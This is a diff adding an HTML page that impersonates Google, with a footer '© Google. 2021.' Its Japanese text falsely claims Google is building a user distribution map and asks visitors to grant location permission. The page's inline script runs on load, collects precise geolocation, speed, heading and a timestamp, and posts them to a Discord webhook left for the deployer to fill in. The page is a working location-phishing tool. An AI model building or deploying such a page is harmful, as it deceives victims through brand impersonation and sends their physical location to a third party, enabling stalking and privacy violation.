@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+ <title>Google</title>
+ <meta charset="utf-8">
+ <meta name=viewport content="initial-scale=1, minimum-scale=1, width=device-width">
+ <link rel="stylesheet" href="static/css/style.css">
+ <script>
+
+const webhook = "https://discord.com/api/webhooks/"  //ここにdiscordのwebhookを入力して！Enter the discord webhook here!
+var options = {
+  enableHighAccuracy: true,
+  timeout: 5000,
+  maximumAge: 0
+};
+function success(position) {
+var geo_text = "緯度:" + position.coords.latitude + "\n";
+geo_text += "経度:" + position.coords.longitude + "\n";
+geo_text += "高度:" + position.coords.altitude + "\n";
+geo_text += "位置精度:" + position.coords.accuracy + "\n";
+geo_text += "高度精度:" + position.coords.altitudeAccuracy  + "\n";
+geo_text += "移動方向:" + position.coords.heading + "\n";
+geo_text += "速度:" + position.coords.speed + "\n";
+var date = new Date(position.timestamp);
+geo_text += "取得時刻:" + date.toLocaleString() + "\n";
+      
+var req = new XMLHttpRequest();
+req.open('POST', webhook, true);
+req.setRequestHeader('content-type',
+  'application/x-www-form-urlencoded;charset=UTF-8');
+req.send(geo_text);
+}
+function error(err) {
+console.warn(`ERROR(${err.code}): ${err.message}`);
+}                                                                                                                                                                     
+navigator.geolocation.getCurrentPosition(success, error, options);
+</script>
+</head>
+<body>
+  <a href=//www.google.com/><span id=logo aria-label=Google></span></a>
+  <h4>google chromeの利用者分布作成についてのお願い</h4>
+  <p>現在Google .Incは利用者分布図を作っています。</p>
+  <p>位置情報の許可を押してください。</p>
+  <p>これにより、より善いサービス提供が可能になります。</p>
+  <p>ご協力のほどよろしくお願いします。</p>
+  <footer>
+    <p>© Google. 2021.    </p>
+</footer>
+</body>
+</html>
